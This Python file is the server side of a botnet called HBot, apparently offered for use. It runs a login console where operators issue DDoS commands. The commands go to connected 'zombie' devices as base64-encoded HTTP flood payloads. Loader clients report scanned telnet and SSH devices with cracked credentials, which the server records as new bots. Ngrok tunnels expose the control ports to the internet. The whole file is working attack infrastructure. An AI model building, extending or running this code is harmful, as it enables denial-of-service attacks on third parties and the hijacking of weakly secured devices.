from lib import network, database, console, tools
import threading, socket, random, time
from pyngrok import ngrok

class Master(threading.Thread):
    def __init__(self, console: console.Console, color: console.Color, database: database.Database, socket_session: socket.socket, ip: str, port: int):
        threading.Thread.__init__(self)

        self.network = network.Network(socket_session, database)
        self.database = database
        self.console = console
        self.color = color
        self.port = port
        self.ok = True
        self.ip = ip

        # Temp session storage
        self.session_time = int(time.time())
        self.login_attemp = 0
        self.kicked_time  = 0
        self.username = None
        self.password = None
        self.logged = False
        self.grade = None

    def kill(self, reason: str, send: bool= False):
        if self.ok:
            if send:
                self.send(reason)
            
            if self in self.database.online_user:
                self.database.online_user.remove(self)

            self.console.print_info(f'{self.ip} -> master killed -> {reason}')
            self.network.close_socket()
            self.ok = False

    def send(self, content: str):
        if not self.network.send_packet(content):
            self.kill('Error when send packet')
    
    def bulk_send(self, packets: list):
        if not self.network.bulk_send_packet(packets):
            self.kill('Error when send packets list')

    def recv(self, content: str= False):
        if content:
            self.send(content)
        
        data = self.network.recv_packet()
        
        if not data:
            self.kill(f'Invalid data recieved')
            return None
        else:
            return data

    # Custom function
    def set_title(self, title: str):
        self.send(f'\033]0;HBot | {title}\007')

    def clear_screen(self):
        self.bulk_send([
            '\033[2J\033[1H',
            '',
            f'    {self.color.fade("╦.╦╔╗.╔═╗╔╦╗")}'.replace('.', f'{self.color.white}.'),
            f'    {self.color.fade("╠═╣╠╩╗║.║.║.")}'.replace('.', f'{self.color.white}.'),
            f'    {self.color.fade("╩.╩╚═╝╚═╝.╩.")}{self.color.reset}'.replace('.', f'{self.color.white}.'),
            '\r'
        ])

    def loop_thread(self):
        while self.ok:
            time.sleep(1)

            if self.logged:
                bd = self.database.get_network_bandwitch()
                send_bd = bd.split('|')[0]
                recv_bd = bd.split('|')[1]

                self.set_title(f'User: {len(self.database.online_user)} | Bots: {len(self.database.online_zombie)} | Vuln: {self.database.total_ssh_bots + self.database.total_telnet_bots} | Loader: {len(self.database.online_loader)} | Command: {self.database.send_command} | Task: {self.database.send_task} | Packet: {send_bd} / {recv_bd}')
            else:
                self.kicked_time = int(time.time()) - self.session_time
                self.set_title(f'Login page | Attemp: {self.login_attemp}/3 | Kicked on: {self.kicked_time}/30s')

                if self.kicked_time >= 30:
                    self.kill('You did not connect in time !', True)

    def login(self):
        self.clear_screen()

        while self.ok:
            if self.login_attemp == 3:
                self.kill('Max login attemp', True) 
            else:
                self.login_attemp += 1

            self.username = self.recv(f'{self.color.red}>{self.color.reset} Username{self.color.reset}: ')
            self.password = self.recv(f'{self.color.red}>{self.color.reset} Password{self.color.reset}: ')

            if self.database.user_valid(self.username, self.password):
                self.grade = self.database.get_user(self.username)['grade']
                self.logged = True
                break
        
        return self.logged

    def prompt(self):
        while self.ok:
            cmd = self.recv(self.color.fade(f'\r{self.username}@HBot ~$ ').replace('@', f'{self.color.white}@') + self.color.white)
            
            if not cmd:
                return
            
            self.database.send_command += 1

            argument = cmd.split(' ')
            command = argument[0]

            # TODO: Show only avaiable commands and clean shit code
            if command == 'help': # ・> | Rip eyes
                table = self.console.raw_fade(self.console.get_custom_table(['📌 COMMAND', '📋 DESCRIPTION', '⭐ PERMISSION'], [
                    'clear\nmethod\nlist\ncreate_acc\ndelete_acc\nkill\nstats\nexit',
                    'Clean the screen\nSee attack methods\nSee connected users\nCreate an account\nDelete an account\nKick user from server\nShow cool stuff\nClose session',
                    'all\nall\nadmin\nroot\nroot\nroot\nall\nall'
                    ]))
                self.bulk_send(table)

            elif command == 'exit':
                self.kill('Goobye <3', True)

            elif command == 'stats':
                bd = self.database.get_network_bandwitch()
                send_bd = bd.split('|')[0]
                recv_bd = bd.split('|')[1]

                self.bulk_send(self.console.bulk_fade([
                    f'\n> Account informations:',
                    f'  - Username: {self.username}',
                    f'  - Grade:    {self.grade}',
                    f'\n> Connected device:',
                    f'  - Loader: {len(self.database.online_loader)}',
                    f'  - Zombie: {len(self.database.online_zombie)}/{self.database.total_telnet_bots + self.database.total_ssh_bots}',
                    f'  - User:   {len(self.database.online_user)}',
                    f'\n> Trafic:',
                    f'  - Total recieved packet: {self.database.recv_packet} ({recv_bd})',
                    f'  - Total sent packet:     {self.database.send_packet} ({send_bd})',
                    f'  - Command send:          {self.database.send_command}',
                    f'  - Task send:             {self.database.send_task}\n'
                ]))

            elif command == 'clear':
                self.clear_screen()

            elif command == 'method':
                table = self.console.raw_fade(self.console.get_simple_table('METHOD', '💥', ['http']))
                self.bulk_send(table)

            elif command == 'ddos':
                if len(argument) < 4:
                    self.send('Bad syntax: ddos <method> <ip> <port> <time>\n')
                
                else:
                    ip = argument[2]
                    port = argument[3]
                    timeout = argument[4]
                    method = argument[1]

                    for zombie in self.database.online_zombie:
                        zombie.ddos_payload(ip, port, timeout, method)

            # Admin command
            elif self.grade not in ['root', 'admin']:
                self.send(f'You are not allowed to use an {self.color.yellow}Admin{self.color.reset} command !\n')

            elif command == 'list':
                data = []

                for user in self.database.online_user:
                    data.append(f'User n°{self.color.magenta}{len(data) + 1}{self.color.reset} - Username: {self.color.yellow}{user.username}{self.color.reset} Grade: {self.color.green}{user.grade}{self.color.reset} Session-Time: {self.color.blue_m}{int(time.time()) - user.session_time}{self.color.reset}s')
                
                self.bulk_send(data)

            # Root command
            elif self.grade not in ['root']:
                self.send(f'You are not allowed to use an {self.color.yellow}Root{self.color.reset} command !\n')
            
            # create_acc <user> <pass> <grade>
            elif command == 'create_acc':
                if len(argument) < 4:
                    self.send(f'Bad syntax: create_acc <{self.color.orange}username{self.color.reset}> <{self.color.red}password{self.color.reset}> <{self.color.yellow}grade{self.color.reset}>\n')
                
                else:
                    if self.database.create_user(argument[1], argument[2], argument[3]):
                        self.send(f'The user has been successfully created\n')

            elif command == 'delete_acc':
                if len(argument) < 2:
                    self.send(f'Bad syntax: delete_acc <{self.color.orange}username{self.color.reset}>\n')
                
                else:
                    result = self.database.delete_user(argument[1])
                    disconnected= 0

                    if result:
                        for user in self.database.online_user:
                            if user.username == argument[1]:
                                disconnected += 1
                                user.kill(f'Account was deleted by {self.username}', True)

                        self.send(f'The account has been successfully deleted, {disconnected} users have been kicked\n')
                    else:
                        self.send(f'Invalid account\n')

            elif command == 'kill':
                if len(argument) < 2:
                    self.send(f'Bad syntax: kill <{self.color.orange}username username1 username2{self.color.reset}>\n')
                
                else:
                    disconnected= 0

                    for user in self.database.online_user:
                        if user.username in argument:
                            disconnected += 1
                            user.kill(f'Kicked by {self.username}', True)
                    
                    self.send(f'{disconnected} users was successfully kicked\n')
            

    def run(self):
        threading.Thread(target= self.loop_thread).start()

        if self.login():
            self.database.online_user.append(self)
            self.clear_screen()

            self.bulk_send([
                self.color.fade(f'  ╔═══════════════════════════════════~'),
                 self.color.fade('  ║ ') + f'{self.color.reset}Welcome {self.color.underline}{self.color.white}{self.username}{self.color.reset}, Grade: {self.color.green}{self.grade}{self.color.reset}.',
                 self.color.fade('  ║ ') + f'{self.color.reset}Type "{self.color.magenta}help{self.color.reset}" to see commands and "{self.color.magenta}exit{self.color.reset}" to disconnect.',
                self.color.fade(f'  ╚═════════════════════════════════════════════════════~\n'),
            ])
            
            self.prompt()

class Loader(threading.Thread):
    def __init__(self, console: console.Console, database: database.Database, socket_session: socket.socket, ip: str, port: int, http_port: int):
        threading.Thread.__init__(self)

        self.network = network.Network(socket_session, database)
        self.http_port = http_port
        self.database = database
        self.console = console
        self.port = port
        self.ok = True
        self.ip = ip

        # Temp session storage
        self.session_time = int(time.time())

    def kill(self, reason: str, send: bool= False):
        if self.ok:
            if send:
                self.send(reason)
            
            if self in self.database.online_loader:
                self.database.online_loader.remove(self)

            self.console.print_info(f'{self.ip} -> loader killed -> {reason}')
            self.network.close_socket()
            self.ok = False

    def send(self, content: str):
        if not self.network.send_packet(content):
            self.kill('Error when send packet')

    def recv(self, content: str= False):
        if content:
            self.send(content)
        
        data = self.network.recv_packet()

        if not data:
            self.kill('Invalid data recieved')
            return None
        else:
            return data

    def loop_thread(self):
        while self.ok:
            time.sleep(60)
            self.send('ping')

    def run(self):
        network.FileServer(self.http_port).start()
        threading.Thread(target= self.loop_thread).start()
        self.database.online_loader.append(self)

        while self.ok:
            data = self.recv(False)
            
            
            if data == None:
                return

            if '|' in data:
                argument = data.split('|')
                req_type = argument[0]
                
                # scan|127.0.0.1|23|user|pass|telnet 
                if req_type == 'scan':
                    ip = argument[1]
                    port = argument[2]
                    username = argument[3]
                    password = argument[4]
                    device_type = argument[5]

                    # Due to bug :c, 
                    if device_type == 'telnetscan':
                        device_type = 'telnet'

                    count = self.database.create_bot(username, password, ip, port, device_type)
                    if device_type == 'telnet':
                        self.database.total_telnet_bots = count
                    else:
                        self.database.total_ssh_bots = count

                    self.console.print_success(f'{self.ip} -> New {device_type} bot "{username}:{password} {ip}:{port}" -> {count} bots')

class Zombie(threading.Thread):
    def __init__(self, console: console.Console, database: database.Database, socket_session: socket.socket, ip: str, port: int):
        threading.Thread.__init__(self)

        self.network = network.Network(socket_session, database)
        self.database = database
        self.console = console
        self.port = port
        self.ok = True
        self.ip = ip

        # Temp session storage
        self.session_time = int(time.time())

    def kill(self, reason: str, send: bool= False):
        if self.ok:
            if send:
                self.send(reason)
            
            if self in self.database.online_zombie:
                self.database.online_zombie.remove(self)

            self.console.print_info(f'{self.ip} -> zombie killed -> {reason}')
            self.network.close_socket()
            self.ok = False

    def send(self, content: str):
        if not self.network.send_packet(content):
            self.kill('Error when send packet')

    def recv(self, content: str= False):
        if content:
            self.send(content)
        
        data = self.network.recv_packet()

        if not data:
            self.kill('Invalid data recieved')
            return None
        else:
            return data

    def loop_thread(self):
        while self.ok:
            time.sleep(60)
            self.send('ping')

    def ddos_payload(self, ip: str, port: str, timeout: str, type: str):
        if type == 'http':
            payload = tools.Encoder().base_64(str(open('./payload/http_flood.py', 'r+').read().replace('!ip!', ip).replace('!port!', port).replace('!time!', timeout)).encode())
        
        elif type == 'test':
            payload = tools.Encoder().base_64(str(open('./payload/test_flood.py', 'r+').read().replace('!ip!', ip).replace('!port!', port).replace('!time!', timeout)).encode())

        self.send(f'run|{payload}')

    def run(self):
        threading.Thread(target= self.loop_thread).start()
        self.database.online_zombie.append(self)

# Rip this part, anyone optimize ?
class Handler(threading.Thread):
    def __init__(self, database: database.Database, console: console.Console, color: console.Color):
        threading.Thread.__init__(self)
        self.database = database
        self.console = console
        self.color = color

    def master_thread(self, port: int, url: str):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', port))

        self.console.print_success(f'Master -> online -> port: {port} -> url {url}')

        while True:
            sock.listen(1000)
            (socket_session, (ip, port)) = sock.accept()
            Master(self.console, self.color, self.database, socket_session, ip, port).start()
    
    def loader_thread(self, port: int, url: str, http_port: int, http_url: str):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', port))

        self.console.print_success(f'Loader -> online -> port: {port} -> url {url}')
        self.console.print_success(f'File Server -> online -> port: {http_port} -> url {http_url}')

        while True:
            sock.listen(1000)
            (socket_session, (ip, port)) = sock.accept()
            Loader(self.console, self.database, socket_session, ip, port, http_port).start()

    def zombie_thread(self, port: int, url: str):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', port))

        self.console.print_success(f'Zombie -> online -> port: {port} -> url {url}')

        while True:
            sock.listen(1000)
            (socket_session, (ip, port)) = sock.accept()
            Zombie(self.console, self.database, socket_session, ip, port).start()

    def run(self):
        # Rip shit code btw 
        mp = random.randint(1500, 30000)
        lp = random.randint(30001, 55000)
        zp = random.randint(55001, 60000)
        hp = random.randint(60001, 65000)

        ml = (ngrok.connect(mp, 'tcp').public_url).split('://')[1]
        ll = (ngrok.connect(lp, 'tcp').public_url).split('://')[1]
        zl = (ngrok.connect(zp, 'tcp').public_url).split('://')[1]
        hl = (ngrok.connect(hp, 'tcp').public_url).split('://')[1]

        threading.Thread(target= self.master_thread, args= (mp, ml,)).start()
        threading.Thread(target= self.loader_thread, args= (lp, ll, hp, hl)).start()
        threading.Thread(target= self.zombie_thread, args= (zp, zl,)).start()

if __name__ == '__main__':
    Database = database.Database('mongodb+srv://....')
    Console = console.Console()
    Color = console.Color()

    Console.cnc_banner()
    Handler(Database, Console, Color).start()